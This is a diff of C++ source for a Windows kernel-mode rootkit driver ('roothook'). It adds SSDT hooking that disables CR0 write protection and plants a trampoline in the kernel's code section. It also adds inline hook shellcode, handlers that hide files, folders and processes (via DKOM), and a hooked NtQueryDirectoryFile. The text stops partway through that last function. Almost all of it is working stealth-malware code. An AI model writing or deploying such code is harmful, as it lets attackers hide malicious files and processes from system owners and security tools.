@@ -1,39 +1,23 @@
 #include "hooking.h"
 #include "HookingGlobals.h"
 #pragma warning(disable : 4996)
+#pragma warning(disable : 4302)
+#pragma warning(disable : 4311)
 
 
-void ShrootUnload(PDRIVER_OBJECT DriverObject) {
-	UNICODE_STRING QueryUnicode = { 0 };
-	PVOID OriginalQueryDirFile = NULL;
-
-	UNREFERENCED_PARAMETER(DriverObject);
-
-
-	// Find NtQueryDirectoryFile base and unhook it:
-	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");
-	OriginalQueryDirFile = MmGetSystemRoutineAddress(&QueryUnicode);
-	if (OriginalQueryDirFile != NULL) {
-		WriteToReadOnlyMemoryMEM(OriginalQueryDirFile, OriginalNtQueryDirFile, sizeof(DEFAULT_SHELLCODE), TRUE);
-	}
-}
-
-
-NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
-	/*
-	Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
-	Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
-	*/
-	PVOID* SaveBuffer = NULL;
+/*
+NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, ULONG Tag) {
+	// Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
+	// Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
 	ULONG64 ReplacementValue = 0;
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	UNICODE_STRING TargetName = { 0 };
 	ANSI_STRING AnsiTargetName = { 0 };
 	PVOID TargetFunction = NULL;
-	BYTE ShellCode[] = { 0x51,  // push rcx
-	0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rcx, ReplacementFunc (64 bit value of address)
-	0x48, 0x87, 0x0C, 0x24,  // xchg QWORD PTR [rsp], rcx  (put 64 bit address instead of original rcx in stack)
-	0xC3 };  // ret (jump to rcx value - the value of ReplacementFunc)
+	BYTE ShellCode[] = { 0x90, 0x90, 0x90, 0x90, 0x90,   // nop ; nop ; nop ; nop ; nop (filled to pad to full insts) 
+						0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
+									0x41, 0xff, 0xe5 };  // jmp r13 (jmp evilfunction)
+	PVOID TrampolineBuffer = NULL;
 
 
 	// Check for invalid parameters:
@@ -45,6 +29,91 @@ NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleN
 	}
 
 	
+	// Get the address of the target function:
+	if (ModuleName == NULL) {
+		RtlInitAnsiString(&AnsiTargetName, RoutineName);
+		Status = RtlAnsiStringToUnicodeString(&TargetName, &AnsiTargetName, TRUE);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (cannot get RoutineName in UNICODE_STRING format: 0x%x)\n", Status);
+			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+		TargetFunction = MmGetSystemRoutineAddress(&TargetName);
+		if (TargetFunction == NULL) {
+			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+			DbgPrintEx(0, 0, "KMDFdriver Hooking - Kernel function hook failed (cannot get address of kernel function %wZ)\n", &TargetName);
+			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+			return STATUS_INVALID_ADDRESS;
+		}
+	}
+	else {
+		TargetFunction = SystemModuleExportMEM(ModuleName, RoutineName);
+		if (TargetFunction == NULL) {
+			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+			DbgPrintEx(0, 0, "KMDFdriver Hooking - Driver function hook failed (failed getting the driver function base address)\n");
+			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+			return STATUS_INVALID_ADDRESS;
+		}
+	}
+
+	
+	// Allocate trampoline pool, copy trampoline template into pool and change the afterhookaddr field to afterhookaddr:
+	Status = InitiateTrampolinePool(Tag, &TrampolineBuffer, (ULONG64)TargetFunction + sizeof(ShellCode));
+	if (!NT_SUCCESS(Status)) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to initiate trampoline pool: 0x%x)\n", Status);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return Status;
+	}
+
+
+	// Prepare the shellcode for deployment and write it into memory:
+	ReplacementValue = (ULONG64)HookingFunction;
+	RtlCopyMemory((PVOID)((ULONG64)ShellCode + 7 * sizeof(BYTE)), &ReplacementValue, sizeof(ReplacementValue));
+	if (!WriteToReadOnlyMemoryMEM(TargetFunction, &ShellCode, sizeof(ShellCode), TRUE)) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to patch the original system function)\n");
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_UNSUCCESSFUL;
+	}
+	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+	if (Tag == 'HkQr') {
+		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook SUCCESS, hook is at %p\n", OriginalNtQueryDirFile);
+	}
+	else {
+		// For now the only other one is 'HkQx' for NtQueryDirectoryFileEx:
+		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook SUCCESS, hook is at %p\n", OriginalNtQueryDirFileEx);
+	}
+	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+	return STATUS_SUCCESS;
+}
+*/
+
+
+NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
+	// Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
+	// Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
+	PVOID* SaveBuffer = NULL;
+	ULONG64 ReplacementValue = 0;
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	UNICODE_STRING TargetName = { 0 };
+	ANSI_STRING AnsiTargetName = { 0 };
+	PVOID TargetFunction = NULL;
+
+	BYTE ShellCode[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
+									0x41, 0xff, 0xe5 };  // jmp r13 (jump to r13 value - the value of ReplacementFunc)
+						 
+
+	// Check for invalid parameters:
+	if (HookingFunction == NULL) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (HookingFunction = NULL)\n");
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+
+
 	// Get the address of the target function:
 	if (ModuleName == NULL) {
 		RtlInitAnsiString(&AnsiTargetName, RoutineName);
@@ -79,7 +148,6 @@ NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleN
 		switch (Tag) {
 		case 'HkQr': SaveBuffer = &OriginalNtQueryDirFile; break;
 		case 'HkQx': SaveBuffer = &OriginalNtQueryDirFileEx; break;
-		case 'HkCf': SaveBuffer = &OriginalNtCreateFile; break;
 		default: return STATUS_INVALID_PARAMETER;
 		}
 		*SaveBuffer = ExAllocatePoolWithTag(NonPagedPool, sizeof(ShellCode), Tag);
@@ -103,7 +171,7 @@ NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleN
 
 	// Prepare the shellcode for deployment and write it into memory:
 	ReplacementValue = (ULONG64)HookingFunction;
-	RtlCopyMemory(&ShellCode[3], &ReplacementValue, sizeof(PVOID));
+    RtlCopyMemory(&ShellCode[2], &ReplacementValue, sizeof(PVOID));
 	if (!WriteToReadOnlyMemoryMEM(TargetFunction, &ShellCode, sizeof(ShellCode), TRUE)) {
 		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
 		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to patch the original system function)\n");
@@ -117,20 +185,229 @@ NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleN
 }
 
 
-NTSTATUS roothook::SystemServiceDTHook() {
+ULONG roothook::SSDT::GetSystemCallIndex(PUNICODE_STRING SystemServiceName) {
+	PVOID SystemServiceAddress = MmGetSystemRoutineAddress(SystemServiceName);
+	if (SystemServiceAddress == NULL) {
+		return 0;
+	}
+	return (*(PULONG)((PUCHAR)SystemServiceAddress + 1));
+}
+
+
+void roothook::SSDT::EnableWriteProtection(KIRQL CurrentIRQL) {
+	ULONG64 cr0 = __readcr0() | 0x10000;
+	_enable();  // Enable interrupts, mightve interrupted the process
+	__writecr0(cr0);
+	KeLowerIrql(CurrentIRQL);
+}
+
+
+KIRQL roothook::SSDT::DisableWriteProtection() {
+	KIRQL CurrentIRQL = KeRaiseIrqlToDpcLevel();
+	ULONG64 cr0 = __readcr0() & 0xfffffffffffeffff;  // Assumes processor is AMD64
+	__writecr0(cr0);
+	_disable();    // Disable interrupts
+	return CurrentIRQL;
+}
+
+
+ULONG64 roothook::SSDT::CurrentSSDTFuncAddr(ULONG SyscallNumber) {
+	LONG SystemServiceValue = 0;
+	PULONG ServiceTableBase = NULL;
+	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
+	SystemServiceValue = ServiceTableBase[SyscallNumber];
+	SystemServiceValue = SystemServiceValue >> 4;
+	return (ULONG64)SystemServiceValue + (ULONG64)ServiceTableBase;
+}
+
+
+ULONG64 roothook::SSDT::GetServiceDescriptorTable() {
+	BYTE* SearchStartAddress = (BYTE*)__readmsr(0xC0000082);
+	BYTE* SearchEndAddress = (BYTE*)(((ULONG64)SearchStartAddress + PAGE_SIZE) & (~0x0FFF));  // Scan until a page after the starting address + allign the end address to PAGE_SIZE (0x1000)
+	PULONG MatchingCodeAddress = NULL;
+	while (SearchStartAddress < SearchEndAddress){
+		if ((*(PULONG)SearchStartAddress & 0xFFFFFF00) == 0x83f70000){
+			MatchingCodeAddress = (PULONG)(SearchStartAddress - 12);
+			return (ULONG64)MatchingCodeAddress + (((*(PULONG)MatchingCodeAddress) >> 24) + 7) + (ULONG64)(((*(PULONG)(MatchingCodeAddress + 1)) & 0x0FFFF) << 8);
+		}
+		SearchStartAddress++;
+	}
+	return NULL;  // Stub was not found in the range searched
+}
+
+
+ULONG roothook::SSDT::GetOffsetFromSSDTBase(ULONG64 FunctionAddress) {
+	PULONG ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
+	return ((ULONG)(FunctionAddress - (ULONGLONG)ServiceTableBase)) << 4;
+}
+
+
+NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, PUNICODE_STRING SystemServiceName){
+	/*
+	Business logic of hook:
+	1) Get address of ServiceDescriptorTable with specific pattern matching in the kernel code section (.text)
+	2) Get the address of the current function (will be put in *OriginalFunction) from the SSDT
+	3) Add the address of the hooking function to the data of the trampoline dummy (SSDT entry is only 32 bits in x64, need to create stub hook and kump to that)
+	4) Find an area inside the kernel's code section (.text) that can hold the data of the trampoline dummy hook (check sequence of nops big enough)
+	5) Map the kernel's image into writeable memory, change protection settings to be able to write dummy hook into the kernel, write it into the kernel
+	6) Disable WP (Write-Protected), patch the SSDT entry, enable WP protections
+	7) Unmap the kernel image to save changes
+	*/
+
+
+	BYTE DummyTrampoline[] = { 0x50,  // push rax
+							   0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, HookingFunction
+							   0x48, 0x87, 0x04, 0x24,  // xchg QWORD PTR [rsp],rax
+							   0xc3 };  // ret (jmp to HookingFunction)
+	PVOID TrampolineSection = NULL;  // Will hold the matching sequence of nop/int3 instructions for the trampoline hook
+	PVOID KernelMapping = NULL;
+	PVOID* OriginalFunction = NULL;
+	PMDL KernelModuleDescriptor = NULL;
+	PULONG ServiceTableBase = NULL;  // Used to modify the actual entry in the SSDT
+	KIRQL CurrentIRQL = NULL;
+	ULONG SyscallNumber = 0;
+	ULONG SSDTEntryValue = 0;
+	ULONG TextSectionSize = 0;
+
+
+	// Check for invalid parameters:
+	if (HookingFunction == NULL || Tag == 0){  // OriginalFunction == NULL || SyscallNumber == 0) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid parameters: %p, %lu)\n", HookingFunction, Tag);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+
+
+	// Get the original function matching buffer and find the syscall number:
+	switch (Tag) {
+	case 'HkQr': OriginalFunction = &ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
+	case 'HkQx': OriginalFunction = &ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
+	default:
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid tag)\n");
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+
+
+	// Make preperations for SSDT hook - get SSDT address, get ntoskrnl.exe image base address and get code section (.text section) address of the kernel:
+	if (KiServiceDescriptorTable == NULL) {
+		KiServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)roothook::SSDT::GetServiceDescriptorTable();
+	}
+	if (KiServiceDescriptorTable == NULL) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the service descriptor table base address)\n", SyscallNumber);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_NOT_FOUND;
+	}
+	if (KernelImageBaseAddress == NULL) {
+		KernelImageBaseAddress = memory_helpers::GetModuleBaseAddressADD("\\SystemRoot\\System32\\ntoskrnl.exe");
+	}
+	if (KernelImageBaseAddress == NULL) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the base address of the kernel image)\n", SyscallNumber);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_NOT_FOUND;
+	}
+	if (KernelTextSection == NULL) {
+		KernelTextSection = (BYTE*)memory_helpers::GetTextSectionOfSystemModuleADD(KernelImageBaseAddress, &TextSectionSize);
+	}
+	if (KernelTextSection == NULL) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the base address of the .text section of the kernel)\n", SyscallNumber);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_NOT_FOUND;
+	}
+
+
+	// Get the address of the original function from the SSDT and copy the new function (HookingFunction) to the trampoline hook:
+	*OriginalFunction = (PVOID)roothook::SSDT::CurrentSSDTFuncAddr(SyscallNumber);
+	RtlCopyMemory(&DummyTrampoline[3], &HookingFunction, sizeof(PVOID));
+
+
+	// Find a long enough sequence of nop/int3 instructions in the kernel's .text section to put the trampoline hook in:
+	TrampolineSection = memory_helpers::FindUnusedMemoryADD(KernelTextSection, TextSectionSize, sizeof(DummyTrampoline));
+	if (TrampolineSection == NULL) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find sequence of %lu bytes that are nop/int3 instructions, %p, %lu)\n", SyscallNumber, sizeof(DummyTrampoline), KernelTextSection, TextSectionSize);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_NOT_FOUND;
+	}
+
+	
+	// Map the kernel into writeable space to be able to put trampoline hook in and modify the SSDT entry:
+	KernelModuleDescriptor = IoAllocateMdl(TrampolineSection, sizeof(DummyTrampoline), 0, 0, NULL);
+	if (KernelModuleDescriptor == NULL){
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot allocate module descriptor to write into the kernel image, %p, %lu)\n", SyscallNumber, TrampolineSection, sizeof(DummyTrampoline));
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_MEMORY_NOT_ALLOCATED;
+	}
+	MmProbeAndLockPages(KernelModuleDescriptor, KernelMode, IoWriteAccess);
+	KernelMapping = MmMapLockedPagesSpecifyCache(KernelModuleDescriptor, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
+	if (KernelMapping == NULL){
+		MmUnlockPages(KernelModuleDescriptor);
+		IoFreeMdl(KernelModuleDescriptor);
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot map the kernel into writeable memory)\n", SyscallNumber);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	
+	// Patch the SSDT entry and write trampoline hook into the kernel:
+	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
+	CurrentIRQL = roothook::SSDT::DisableWriteProtection();  // Disable WP (Write-Protection) to be able to write into the SSDT
+	RtlCopyMemory(KernelMapping, DummyTrampoline, sizeof(DummyTrampoline));  // Copy the trampoline hook in the kernel's memory
+	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)TrampolineSection);
+	SSDTEntryValue = SSDTEntryValue & 0xFFFFFFF0;
+	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;  
+	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
+	roothook::SSDT::EnableWriteProtection(CurrentIRQL);  // Enable WP (Write-Protection) to restore earlier settings
+
+
+	// Unmap the kernel image:
+	MmUnmapLockedPages(KernelMapping, KernelModuleDescriptor);
+	MmUnlockPages(KernelModuleDescriptor);
+	IoFreeMdl(KernelModuleDescriptor);
+	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+	DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu succeeded\n", SyscallNumber);
+	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 	return STATUS_SUCCESS;
 }
 
 
-NTSTATUS roothook::InterruptDTHook() {
+NTSTATUS roothook::SSDT::SystemServiceDTUnhook(PVOID HookingFunction, ULONG SyscallNumber) {
+	PULONG ServiceTableBase = NULL;
+	KIRQL CurrentIRQL = NULL;
+	ULONG SSDTEntryValue = NULL;
+	if (HookingFunction == NULL || SyscallNumber == 0) {
+		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid parameters: %p, %lu)\n", HookingFunction, SyscallNumber);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
+		return STATUS_INVALID_PARAMETER;
+	}
+	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
+	CurrentIRQL = roothook::SSDT::DisableWriteProtection();
+	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)HookingFunction);
+	SSDTEntryValue &= 0xFFFFFFF0;
+	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;
+	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
+	roothook::SSDT::EnableWriteProtection(CurrentIRQL);
+	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
+	DbgPrintEx(0, 0, "KMDFdriver SSDT unhook %lu succeeded\n", SyscallNumber);
+	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
 	return STATUS_SUCCESS;
 }
 
 
 NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=REQUEST LOG=-=-=-=-=-\n\n");
-	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER (highest UM address = %p)\n", (PVOID)general::GetHighestUserModeAddrADD());
+	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER (highest UM address = %p)\n", (PVOID)memory_helpers::GetHighestUserModeAddrADD());
 
+	PVOID FileNameBuffer = NULL;
+	UNICODE_STRING FileName = { 0 };
 	ROOTKIT_MEMORY* RootkInstructions = (ROOTKIT_MEMORY*)hookedf_params;
 	NTSTATUS Return = STATUS_SUCCESS;
 
@@ -179,6 +456,79 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 		Return = AllocSpecificMemoryRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
 		return Return;
+
+	case RKOP_HIDEFILE:
+		// hide file/folder -
+
+		DbgPrintEx(0, 0, "Request Type: hide file/folder (0xFFFFFFFFFFFFFFFF = hide, 0x7777FFFFFFFFFFFF = return list, else = remove by index (value = index),\nActual reserved value: %p", RootkInstructions->Reserved);
+		
+		// Handle additional preoperation dependencies:
+		if ((ULONG64)RootkInstructions->Reserved == HIDE_FILE) {
+			FileNameBuffer = ExAllocatePoolWithTag(NonPagedPool, RootkInstructions->Size, 'HfNb');
+			if (FileNameBuffer == NULL) {
+				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_MEMORY_NOT_ALLOCATED, RootkInstructions);
+			}
+			RootkInstructions->Out = FileNameBuffer;
+		}
+		else if ((ULONG64)RootkInstructions->Reserved == SHOW_HIDDEN) {
+			RootkInstructions->Buffer = &HookHide;
+			RootkInstructions->Size = HookHide.BufferSize;
+		}
+		Return = HideFileObjectRK(RootkInstructions);
+		if (Return == HIDE_TEMPSUC) {
+			// Returned from regular file hiding:
+			RtlInitUnicodeString(&FileName, (WCHAR*)FileNameBuffer);
+			if (!HookHide.AddToHideFile(&FileName)) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to add file/folder name %wZ to hiding list)\n", FileName);
+				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+				if (FileNameBuffer != NULL) {
+					ExFreePool(FileNameBuffer);
+				}
+				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
+			}
+			else {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeded (Succeeded to add file/folder name %wZ to hiding list)\n", FileName);
+				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+				if (FileNameBuffer != NULL) {
+					ExFreePool(FileNameBuffer);
+				}
+				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
+			}
+		}
+		else if (Return == UNHIDE_TEMPSUC) {
+			// Returned from removing file:
+			if (!HookHide.RemoveFromHideFile((int)RootkInstructions->Reserved, &FileName)) {
+				if (FileName.Buffer == NULL) {
+					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu to hiding list)\n", (ULONG64)RootkInstructions->Reserved);
+				}
+				else {
+					DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
+				}
+				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInstructions);
+			}
+			else {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to remove file/folder at index %llu, name %wZ to hiding list)\n", (ULONG64)RootkInstructions->Reserved, FileName);
+				DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+				return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
+			}
+		}
+		else if (Return == SHOWHIDDEN_TEMPSUC) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object succeeded (Succeeded to transfer hidden list to medium, Count %lu, Size %lu, Divider %c)\n", HookHide.HideCount, HookHide.BufferSize, HookHide.HideDivider);
+			DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+			return general_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInstructions);
+		}
+
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (Failed to make basic operation)\n");
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+		return Return;
+	case RKOP_HIDEPROC:
+		// Hide process with DKOM:
+
+		DbgPrintEx(0, 0, "Request Type: hide process via DKOM\n");
+		Return = HideProcessRK(RootkInstructions);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+		return Return;
 	}
 	return STATUS_SUCCESS;
 }
@@ -190,29 +540,34 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	IN PVOID ApcContext OPTIONAL,
 	OUT PIO_STATUS_BLOCK IoStatusBlock,
 	OUT PVOID FileInformation,
-	IN ULONG FileInformationLength,
+	IN ULONG Length,
 	IN FILE_INFORMATION_CLASS FileInformationClass,
 	IN BOOLEAN ReturnSingleEntry,
 	IN PUNICODE_STRING FileName OPTIONAL,
 	IN BOOLEAN RestartScan) {
-	UNICODE_STRING QueryUnicode = { 0 };
-
 	UNICODE_STRING RequestedDir = { 0 };
-	UNICODE_STRING CurrDirName = { 0 };
-	UNICODE_STRING ActualDirName = { 0 };
-
-	UNICODE_STRING CurrFileName = { 0 };
-	UNICODE_STRING ActualFileName = { 0 };
-
-	PVOID DirectoryInfo = NULL;
-	IO_STATUS_BLOCK DirStatus = { 0 };
-	PVOID OriginalQueryDirFile = NULL;
-	QueryDirFile OgNtQueryDirectoryFile = NULL;
-	NTSTATUS Status = STATUS_UNSUCCESSFUL;
-
-
-	// Find NtQueryDirectoryFile base:
+	UNICODE_STRING CurrentFile = { 0 };
+	UNICODE_STRING SusFolder = { 0 };
+	UNICODE_STRING QueryUnicode = { 0 };
+	RtlInitUnicodeString(&SusFolder, L"nosusfolder");
 	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");
+
+	IO_STATUS_BLOCK DirStatus = { 0 };
+	QueryDirFile OgNtQueryDirectoryFile = NULL;
+	//PVOID OriginalQueryDirFile = NULL;
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+	BOOL IsDirSame = TRUE;
+	BOOL IsSystemRoot = TRUE;
+	PVOID HandleInfo = NULL;
+	
+
+	OgNtQueryDirectoryFile = (QueryDirFile)ActualNtQueryDirFile;
+	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
+		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+	//Status = NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length,
+	//	FileInformationClass, ReturnSingleEntry * SL_RETURN_SINGLE_ENTRY + RestartScan * SL_RESTART_SCAN, FileName);
+	/*
+	// Find NtQueryDirectoryFile base:
 	OriginalQueryDirFile = MmGetSystemRoutineAddress(&QueryUnicode);
